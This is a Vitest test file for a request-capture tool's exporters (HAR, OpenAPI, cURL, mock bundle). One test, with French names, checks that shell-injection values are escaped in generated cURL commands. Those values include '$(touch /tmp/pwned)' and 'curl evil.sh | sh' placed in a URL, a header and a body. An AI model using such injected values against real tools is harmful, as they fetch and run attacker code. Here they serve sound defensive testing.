import { describe, it, expect } from "vitest";
import {
  exportCaptureAsHar,
  exportCaptureAsOpenApi,
  capturedToCurl,
  exportCaptureAsMockBundle,
} from "../capture-exporters";
import type { CapturedRequest } from "@/lib/tauri";

const sampleSession: CapturedRequest = {
  id: "req-1",
  method: "POST",
  url: "https://api.example.com/users",
  headers: [["content-type", "application/json"]],
  body: JSON.stringify({ name: "Alice" }),
  timestamp: 1700000000000,
  status: 201,
  responseHeaders: [["content-type", "application/json"]],
  responseBody: JSON.stringify({ id: "u1", name: "Alice", active: true }),
  durationMs: 120,
  error: null,
};

describe("Capture Exporters", () => {
  it("échappe les caractères dangereux dans la commande cURL", () => {
    const hostile: CapturedRequest = {
      ...sampleSession,
      url: 'https://api.example.com/$(touch /tmp/pwned)"; curl evil.sh | sh #',
      headers: [
        ["x-custom", 'value"; curl evil.sh | sh #'],
        ["authorization", "Bearer $SECRET`id`"],
      ],
      body: '{"pw":"$(id)"}',
    };
    const curl = capturedToCurl(hostile);
    // `$` est échappé (`\$`), les backticks aussi : pas d'exécution en shell.
    expect(curl).toContain("\\$(");
    expect(curl).toContain("\\`");
    expect(curl).toContain('\\"');
    // Aucun `$(` ou backtick NON échappé (c.-à-d. précédé d'un caractère autre que `\`).
    expect(/[^\\]\$\(/.test(curl)).toBe(false);
    expect(/[^\\]`/.test(curl)).toBe(false);
    // Les caractères originaux sont présents (échappés) — pas de perte de données.
    expect(curl).toContain("curl -X POST");
    expect(curl).toContain("api.example.com");
  });

  it("génère un cURL simple inchangé dans sa forme", () => {
    const curl = capturedToCurl(sampleSession);
    expect(curl).toContain('curl -X POST "https://api.example.com/users"');
    expect(curl).toContain('-H "content-type: application/json"');
    expect(curl).toContain("--data");
    expect(curl).toContain("name");
    expect(curl).toContain("Alice");
  });

  it("exports valid HAR 1.2 JSON", () => {
    const harRaw = exportCaptureAsHar([sampleSession]);
    const har = JSON.parse(harRaw);
    expect(har.log.version).toBe("1.2");
    expect(har.log.entries).toHaveLength(1);
    expect(har.log.entries[0].request.method).toBe("POST");
    expect(har.log.entries[0].response.status).toBe(201);
  });

  it("exports valid OpenAPI 3.0 specification with inferred schema", () => {
    const openapi = exportCaptureAsOpenApi([sampleSession]) as {
      openapi: string;
      paths: Record<string, Record<string, { responses: Record<string, unknown> }>>;
    };
    expect(openapi.openapi).toBe("3.0.3");
    expect(openapi.paths["/users"]).toBeDefined();
    expect(openapi.paths["/users"].post).toBeDefined();
    expect(openapi.paths["/users"].post!.responses["201"]).toBeDefined();
  });

  it("generates a valid cURL command", () => {
    const curl = capturedToCurl(sampleSession);
    expect(curl).toContain('curl -X POST "https://api.example.com/users"');
    expect(curl).toContain('-H "content-type: application/json"');
    expect(curl).toContain("--data");
  });

  it("exports valid Mock Server Bundle", () => {
    const mockBundle = exportCaptureAsMockBundle([sampleSession]) as {
      version: string;
      mocks: Array<{ response: { status: number } }>;
    };
    expect(mockBundle.version).toBe("1.0");
    expect(mockBundle.mocks).toHaveLength(1);
    expect(mockBundle.mocks[0].response.status).toBe(201);
  });
});
